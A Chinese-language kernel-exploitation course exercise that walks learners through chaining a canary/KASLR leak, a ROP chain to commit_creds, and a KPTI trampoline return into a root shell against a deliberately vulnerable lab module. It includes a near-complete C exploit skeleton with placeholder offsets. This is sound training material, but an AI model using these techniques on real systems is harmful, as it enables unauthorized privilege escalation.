# 練習 B — 從 stack overflow 到 root shell（全 mitigation 開）

> **目標**：把 [Ch 11–16](./11-stack-overflow.md) 的零件，在 **KASLR + SMEP + SMAP + KPTI + stack canary 全開**的環境下，串成一條完整、可重複的 exploit，從一個 kernel stack buffer overflow 拿到 root shell。這是你第一次打一題「什麼都沒關」的 kernel pwn——完成它，Part 2 的控制流路線就真正內化了。

## 背景與動機

前面每一章都在「分階段除錯」：Ch 11 關了 SMEP/SMAP/canary/KASLR 只練控 RIP，Ch 13 加回 SMEP/SMAP，Ch 14 加回 KASLR，Ch 15 加回 KPTI。每一關單獨你都跑過了。真實題不會讓你一關一關來——它一次全開。這個練習模擬 CTF 最常見的「入門 kernel stack 題」：一個有明顯溢位的 misc device，但 `.config` 裡 mitigation 全上，`run.sh` 沒有任何 `no*` 旗標。

這題的價值不在學新技術（零件你都有了），在**整合與排序**：leak 要先於 ROP、canary 要原樣填回、回程要用 KPTI trampoline、每一段的位址都要從同一個 leak 算出。整合時最容易犯的錯，正是這個練習要你親身踩一遍的。

## 任務規格

| 項目 | 規格 |
|---|---|
| 靶 | [Ch 5](./05-first-vulnerable-module.md) 的 `vulndevice.c`（`/dev/vulndevice`），`VULN_IOCTL_WRITE` 有 stack overflow（`req.size` 無上界檢查，寫入 `stack_buf[64]`）；並假設它另有一條能**洩漏** stack 內容的路徑（見下） |
| 環境 | Linux 6.6 LTS、x86-64、QEMU；`.config` 開 `KASLR`、`STACKPROTECTOR_STRONG`、`PAGE_TABLE_ISOLATION`（KPTI）、SMEP/SMAP（CPU 旗標）。`run.sh` **不帶**任何 `nosmep/nosmap/nokaslr/pti=off` |
| 身分 | 以非 root user 啟動 exploit（initramfs 的 `init` 切到一般 user） |
| 產出 | exploit 是一支 **static-compiled C**（`gcc -static -o exp exp.c`），執行後得到 `uid=0` 的 shell |
| 限制 | 不得改 `.config` 關 mitigation；不得用 pwntools（純 syscall/libc）；可假設你手上有與目標相同 build 的 `vmlinux`（用來算 offset 與抽 gadget） |
| 驗收 | 在**全 mitigation 開**下，連續執行 10 次，至少 9 次拿到 root shell 且不 panic（穩定性要求） |

### 關於 leak 來源

真實題會給你一條洩漏路徑；本練習假設 `vulndevice.c` 的 `VULN_IOCTL_READ`（`vuln_do_read`）也拿 user 控的 `req.size` 當長度而不檢上界，形成一個 **OOB read**，能把 `stack_buf` 之後的 stack 記憶體（含 canary 與某個 saved 的 kernel 位址）讀回 user。你要用它同時 leak **canary** 與 **一個 kernel text 位址**（推 base）。若你的靶沒有這條路，先照 [Ch 14](./14-kaslr-infoleak.md) 動手練習給 read 路徑加上 OOB。

## 期望輸出範例

```
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ./exp
[*] leaking canary and kernel base via OOB read...
[+] canary      = 0x3a8f1c2e7b4d9600
[+] kernel base = 0xffffffff8a000000
[+] commit_creds       = 0xffffffff8a0a5b40
[+] prepare_kernel_cred= 0xffffffff8a0a5e10
[*] building ROP chain + KPTI trampoline return...
[*] triggering overflow...
[+] back in userland as root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

```
失敗情境（整合錯的典型）：
[*] triggering overflow...
（VM 卡死 / dmesg: stack-protector: Kernel stack is corrupted）
→ canary 沒填對，或填的是別的 process 的 canary
```

## 如果你卡住了

1. **先確認 leak 對不對，再碰 ROP。** 把 leak 出來的 canary 和 kernel 位址印出來，開機兩次比對：canary 每次不同但格式像隨機、kernel 位址減 offset 後要是乾淨的 2MB 對齊 base。leak 錯，後面全錯——別急著排 ROP。
2. **canary 填回去還是 panic？** 你 leak 的 canary 是**哪個 process** 的？leak 和觸發必須同一個 process（canary per-task，[Ch 14](./14-kaslr-infoleak.md)）。別在一個 process leak、fork 另一個去觸發。
3. **ROP 跳第一個 gadget 就 fault？** gadget 位址有沒有加上 leak 出來的 base？你 `ROPgadget` 抽出來的是**靜態**位址，執行期要 `+ kbase`。還有：gadget 是不是對**你這份** vmlinux 抽的？
4. **提權後 VM 卡死 / 回不去？** 多半是 KPTI 回程。先 `pti=off` 驗證「ROP + 提權」本身對，再開 KPTI 換 `swapgs_restore_regs_and_return_to_usermode` 中段進入（[Ch 15](./15-kpti.md)），數清楚進入 offset 與佔位。
5. **`getuid()` 還是非 0？** 用 gdb 在 `commit_creds` 下斷點，確認它真的被呼叫、`rdi` 是 `prepare_kernel_cred` 的回傳值。分清楚是「提權沒成」還是「回程把你送錯地方」。

## 實作步驟建議

### Step 1：準備 offset 與 gadget（離線，對你的 vmlinux）
算出並記錄：`commit_creds`、`prepare_kernel_cred` 相對 base 的 offset；`pop rdi; ret`、`mov rdi, rax`（或等效搬運）等 gadget；`swapgs_restore_regs_and_return_to_usermode` 的符號位址與你要用的中段進入 offset。工具：`readelf -s vmlinux`、`ROPgadget --binary vmlinux`、`objdump -d vmlinux`。

### Step 2：leak canary + kernel base
用 OOB read 路徑讀回 `stack_buf` 之後的記憶體，定位 canary 欄位與一個已知 kernel 符號的殘留位址，算出 `kbase`。**先只做這一步，印出來驗證**。

### Step 3：排 payload
佈局：`[填滿到 canary 前] [leaked_canary] [saved RBP 佔位] [ROP 鏈...]`。ROP 鏈：`pop rdi; ret → 0 → prepare_kernel_cred → (搬 rax→rdi) → commit_creds → KPTI trampoline → iretq frame(回 win)`。所有 kernel 位址 `+ kbase`。

### Step 4：回程與落點
`save_state()` 在觸發前存好 user 的 cs/ss/rflags/rsp；`win()` 裡 `system("/bin/sh")`。KPTI trampoline 的佔位與 iretq frame 對齊（[Ch 15](./15-kpti.md)）。

### Step 5：觸發、穩定化、驗收
`req = {.size = payload_len, .buf = payload}; ioctl(fd, VULN_IOCTL_WRITE, &req)`。跑通後連續跑 10 次驗穩定；若偶爾 panic，檢查 leak 穩不穩、canary 是否每次重新 leak（不要快取上一次的）。

## 完整參考解答

**寫完再看！** 先自己把 leak → ROP → 回程走一遍，卡住了回去翻對應章節，真的過不了再打開。這份是 **PoC 骨架**，位址/offset/gadget 一律標「依你的 vmlinux 填入」——因為它們綁死你的 build，照抄必錯；填值的過程本身就是這題要練的東西。

<details>
<summary>點開參考實作（骨架，未在本環境實測，理論預期行為）</summary>

```c
/* exp.c — 全 mitigation 下 stack overflow → root（PoC 骨架）
 * 編譯：gcc -static -o exp exp.c
 * 未在本環境實測；所有 0x???? 依你的 vmlinux 用 readelf/ROPgadget/objdump 填入。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define VULN_MAGIC 'v'
#define VULN_IOCTL_WRITE _IOW(VULN_MAGIC, 1, struct vuln_req)
#define VULN_IOCTL_READ  _IOR(VULN_MAGIC, 2, struct vuln_req)
struct vuln_req { unsigned long size; void *buf; };

/* ===== 離線算出的 offset（相對 kernel base），依你的 vmlinux 填 ===== */
#define OFF_LEAK_SYM     0x????   /* leak 到的那個殘留符號的 offset */
#define OFF_COMMIT_CREDS 0x????
#define OFF_PREP_CRED    0x????
#define OFF_POP_RDI      0x????   /* pop rdi ; ret */
#define OFF_MOV_RDI_RAX  0x????   /* mov rdi, rax ; ... ; ret（或等效接力）*/
#define OFF_KPTI_TRAMP   0x????   /* swapgs_restore_regs_and_return_to_usermode + 中段進入 offset */

/* leak 回來的記憶體裡，canary 與 kernel 位址各在第幾個 8-byte（依你的靶/佈局定）*/
#define IDX_CANARY       ??
#define IDX_KERN_PTR     ??

unsigned long user_cs, user_ss, user_rflags, user_sp;
void win(void) {                        /* 回到 user、已 root */
    if (getuid() == 0) { puts("[+] back in userland as root"); system("/bin/sh"); }
    else puts("[-] still not root");
    _exit(0);
}
static void save_state(void) {          /* 必須在觸發前呼叫 */
    __asm__ volatile(
        "movq %%cs,  %0\n movq %%ss, %1\n movq %%rsp, %2\n pushfq\n popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags));
}

int main(void) {
    save_state();
    int fd = open("/dev/vulndevice", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    /* ---- Step 2: leak canary + kernel base（OOB read）---- */
    unsigned long leak[0x80] = {0};
    struct vuln_req rr = { .size = sizeof(leak), .buf = leak };   /* 故意超過物件 */
    puts("[*] leaking canary and kernel base via OOB read...");
    ioctl(fd, VULN_IOCTL_READ, &rr);

    unsigned long canary = leak[IDX_CANARY];
    unsigned long kbase  = leak[IDX_KERN_PTR] - OFF_LEAK_SYM;
    printf("[+] canary      = 0x%lx\n", canary);
    printf("[+] kernel base = 0x%lx\n", kbase);

    unsigned long commit_creds = kbase + OFF_COMMIT_CREDS;
    unsigned long prep_cred    = kbase + OFF_PREP_CRED;
    unsigned long pop_rdi      = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax  = kbase + OFF_MOV_RDI_RAX;
    unsigned long kpti_tramp   = kbase + OFF_KPTI_TRAMP;
    printf("[+] commit_creds       = 0x%lx\n", commit_creds);
    printf("[+] prepare_kernel_cred= 0x%lx\n", prep_cred);

    /* ---- Step 3+4: 排 payload（canary 填回 + ROP + KPTI 回程）---- */
    puts("[*] building ROP chain + KPTI trampoline return...");
    unsigned long p[0x80]; int i = 0;
    /* 填滿 stack_buf 到 canary 前（64 bytes = 8 個 qword；實際墊距以你的 frame 為準）*/
    for (int k = 0; k < 8; k++) p[i++] = 0x4141414141414141UL;
    p[i++] = canary;                       /* canary 原樣填回 */
    p[i++] = 0x4242424242424242UL;         /* saved RBP 佔位 */
    /* ROP：commit_creds(prepare_kernel_cred(NULL)) */
    p[i++] = pop_rdi; p[i++] = 0;          /* rdi = NULL */
    p[i++] = prep_cred;                    /* rax = 新 cred */
    p[i++] = mov_rdi_rax;                  /* rdi = rax（視 gadget 可能要接力）*/
    p[i++] = commit_creds;                 /* commit_creds(cred) */
    /* KPTI 回程：跳 trampoline 中段 */
    p[i++] = kpti_tramp;
    p[i++] = 0; p[i++] = 0;                /* trampoline 中段的佔位（數量依進入 offset）*/
    p[i++] = (unsigned long)&win;          /* iretq frame: RIP */
    p[i++] = user_cs;
    p[i++] = user_rflags;
    p[i++] = user_sp;
    p[i++] = user_ss;

    /* ---- Step 5: 觸發 ---- */
    puts("[*] triggering overflow...");
    struct vuln_req wr = { .size = i * sizeof(unsigned long), .buf = p };
    ioctl(fd, VULN_IOCTL_WRITE, &wr);      /* 不會正常返回：trampoline 把我們送回 win() */
    puts("[-] returned unexpectedly");     /* 走到這代表回程壞了 */
    return 0;
}
```

**解答說明**：

- **順序是關鍵**：`save_state` → leak → 算位址 → 排 payload → 觸發。leak 必須在同一個 process、同一次執行裡完成，canary 才對得上。
- **canary 填回**在 ROP 之前、saved RBP 之前——它在 stack 上的位置介於 `stack_buf` 和 saved RBP 之間，順序錯一個 qword 就 panic。
- **`mov rdi, rax`** 這類搬運 gadget 不一定存在；找不到就用兩三個 gadget 接力（例如 `push rax; pop rdi` 系列），這題的 gadget 湊法本身就是 Ch 13 的練習。
- **KPTI trampoline 的佔位數**（我這裡寫兩個 0）完全取決於你從哪個 offset 進入——`objdump` 數清楚進入點後面還會 pop 幾個，佔位就給幾個，否則 iretq frame 錯位。
- **穩定性**：這條鏈理論上很穩（stack overflow 不涉及 race/heap 布局），10/10 應可達；若不穩，嫌疑最大的是 leak 偶爾讀到非預期值——加一個「leak 出來的 kbase 必須 2MB 對齊」的 sanity check，不對就重 leak。

</details>

## 測試用例

| 情境 | 預期結果 | 說明 |
|---|---|---|
| 正常執行（全 mitigation 開） | 拿到 `uid=0` shell | 主路徑 |
| 連續執行 10 次 | ≥9 次成功、不 panic | 穩定性驗收 |
| 故意填錯 canary（改一個 byte） | dmesg `stack-protector: corrupted`，不提權 | 驗證 canary 檢查確實生效 |
| 用 A process 的 canary 去 B process 觸發 | panic | 驗證 canary per-task |
| gadget 位址忘了 `+ kbase` | 第一個 gadget fault | 驗證 KASLR 下必須加 base |
| `pti=off` 下用 `swapgs; iretq` 簡化回程 | 成功（對照組） | 證明 KPTI 才是逼你用 trampoline 的原因 |

## 延伸挑戰（加分）

1. **換成 data-only 收尾**：ROP 不呼叫 `commit_creds`，改成用一次 write-what-where 把 `modprobe_path` 覆寫成 `/tmp/x`（[Ch 16](./16-classic-primitives.md)），比較兩種收尾的程式碼量與穩定性，並說明哪種能繞過 CFI。
2. **去掉 text leak**：改用「leak 自己的 task_struct/cred 位址 → 直接改 cred uid=0」的路線，做出一個**不需要 kernel text base** 的版本。
3. **把 exploit 模組化**：把 `save_state + escalate + kpti_return` 抽成一個可重用的 header，之後 Part 3 的題直接 include。
4. **FGKASLR 思想實驗**：若目標開了 FGKASLR（[Ch 26](./26-modern-mitigations.md)），你這條「一個 text leak 推所有 offset」的鏈哪裡會壞？要補 leak 什麼才救得回來？（只需寫分析，不需實作）

## 自我檢核

- [ ] 能在全 mitigation 開下，從 leak 到 root shell 獨立走完，不看參考解答
- [ ] 能解釋為什麼 leak、canary 填回、ROP、KPTI 回程的**順序**不能亂，各自錯了會怎麼表現
- [ ] 能說出自己的 exploit 哪些值是「綁 vmlinux build、不能照抄」的，以及用什麼指令取得
- [ ] 能把控制流收尾換成 data-only 收尾，並說明兩者在繞 CFI 上的差異
- [ ] 能說出這題為什麼穩定性容易達標（對比後面 heap/race 題為什麼難），即 bug 類型對穩定性的影響

Part 2 到此結束：你已經能在控制流路線上打穿一題全 mitigation 的 stack 題。但真實 kernelCTF 的主戰場不是 stack，是 **heap**——SLUB 上的 UAF、overflow、cross-cache。下一個 Part 從 heap overflow 開始，那裡沒有「乾淨的 saved RIP」等著你蓋，一切要靠控制 SLUB 的物件布局重新長出來。

→ [Ch 17 — Heap overflow in kmalloc：相鄰 object 布局與 cache 選擇](./17-heap-overflow.md)
